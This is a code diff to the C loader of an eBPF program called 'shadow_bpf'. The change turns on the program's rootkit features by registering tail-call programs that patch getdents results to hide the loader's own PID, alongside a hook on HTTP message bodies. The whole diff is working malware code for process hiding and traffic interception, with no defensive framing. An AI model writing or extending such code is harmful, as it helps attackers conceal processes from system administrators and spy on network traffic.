@@ -80,6 +80,8 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
     return 0;
 }
 
+int g_pid;
+
 int main(int argc, char *argv[])
 {
     struct shadow_bpf *skel = NULL;
@@ -98,8 +100,8 @@ int main(int argc, char *argv[])
     }
 
     char pid_to_hide[MAX_PID_LEN] = { 0 };
-    int pid = getpid();
-    sprintf(pid_to_hide, "%d", pid);
+    g_pid = getpid();
+    sprintf(pid_to_hide, "%d", g_pid);
     strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
     skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
 
@@ -114,7 +116,7 @@ int main(int argc, char *argv[])
     int index = PROG_01;
     int prog_fd = bpf_program__fd(skel->progs.http_find_msg_body_start);
     int ret = bpf_map_update_elem(
-        bpf_map__fd(skel->maps.map_prog_array),
+        bpf_map__fd(skel->maps.map_prog_array_fentry),
         &index, 
         &prog_fd,
         BPF_ANY
@@ -123,11 +125,11 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
         goto cleanup;
     }
-    /*
+    /* use separate prog map for tp */
     index = PROG_03;
     prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
     ret = bpf_map_update_elem(
-        bpf_map__fd(skel->maps.map_prog_array),
+        bpf_map__fd(skel->maps.map_prog_array_tp_syscall),
         &index, 
         &prog_fd,
         BPF_ANY
@@ -139,7 +141,7 @@ int main(int argc, char *argv[])
     index = PROG_04;
     prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
     ret = bpf_map_update_elem(
-        bpf_map__fd(skel->maps.map_prog_array),
+        bpf_map__fd(skel->maps.map_prog_array_tp_syscall),
         &index, 
         &prog_fd,
         BPF_ANY
@@ -148,7 +150,7 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
         goto cleanup;
     } 
-    */
+    
     /* attach kprobes */
     err = shadow_bpf__attach(skel);
     if (err) {
@@ -165,7 +167,7 @@ int main(int argc, char *argv[])
     }
 
     printf("Successfully started!\n"); 
-    printf("PID: %d\n", pid);
+    printf("PID: %d\n", g_pid);
 
     while (!exiting) {
         err = ring_buffer__poll(rb, 100 /* timeout, ms */);
